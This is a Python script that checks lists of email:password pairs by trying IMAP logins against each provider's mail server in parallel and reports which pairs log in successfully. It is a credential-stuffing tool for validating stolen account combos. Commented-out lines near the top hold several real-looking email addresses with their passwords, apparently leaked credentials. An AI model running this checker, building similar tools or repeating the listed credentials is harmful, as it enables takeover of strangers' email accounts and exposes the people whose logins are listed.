
import email
import imaplib
import json
import time
import multiprocessing
import sys
import re


email = sys.argv[1]
#email = "lorray.ward@videotron.ca:law81323"
#email = "cfill@comcast.net:Cfill04121"
#email = "fostinganny400@hotmail.com:HuOlEk395"
#email = "LoloHoda400@hotmail.com:400400@lo"
#email = 'gabriellainfo@alice.it:04031972'
#email = "kokofofo400@hotmail.com:HuOlEk395|"
#email ='jacinta7qhi@hotmail.com:HuOlEk395'
#email ='jacinta7qhi@hotmail.com:HuOlEk35'
list_mails = [x.strip() for x in email.split(',')]  # to array


def opentest(t, email, password):
    match = re.search(
        r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9]+\.[a-zA-Z0-9.]*\.*$)", email)
    if match:
        try:
           isp_domain = email.split('@')[1]
#           print(isp_domain)
           isp = init_ImapConfig(isp_domain)[1]
           print(init_ImapConfig(isp_domain))
           port = init_ImapConfig(isp_domain)[2]
           secure = init_ImapConfig(isp_domain)[3]
           
           #mail = imaplib.IMAP4(isp, port)
           if secure == "ssl":
              mail = imaplib.IMAP4_SSL(isp, port)
           if secure == "nossl":
           	mail = imaplib.IMAP4(isp, port)
           mail.login(email, password)
           result = {
                "completed": True,
                "data": {"email": email, "password": password},
                "msg": "pass successFull",
                "err": None,
                "case": 1
           }
        except Exception as e:
            result = {
                "completed": False,
                "data": {"email": email, "password": password},
                "msg": "Exeption",
                "err": str(e),
                "case": 0
            }
    else:
        result = {
            "completed": False,
            "data": {"email": email, "password": password},
            "msg": "Format does not Valid",
            "err": "email does not respect format",
            "case": 2,
        }
    print(json.dumps(result))


def multiprocces(username, password, t):
    opentest(t, username, password)


def init_ImapConfig(hot):
    global ImapConfig
    ImapConfig = {}
    try:
        with open("/var/www/html/projects/checkemails_node/python/hoster.dat", "r") as f:
            for line in f:
                if len(line) > 1:
		   
	                    hoster = line.strip().split(':')
        	            ImapConfig[hoster[0]] = (hoster[1], hoster[2])
                	    if hot == hoster[0]:
                        	return hoster
    except Exception:
        print("[ERROR]hoster.dat", "not found!")


for i in list_mails:
    process = multiprocessing.Process(target=multiprocces, args=(
        i.split(':')[0], i.split(':')[1], "multiprocessing 1"))
    process.start()
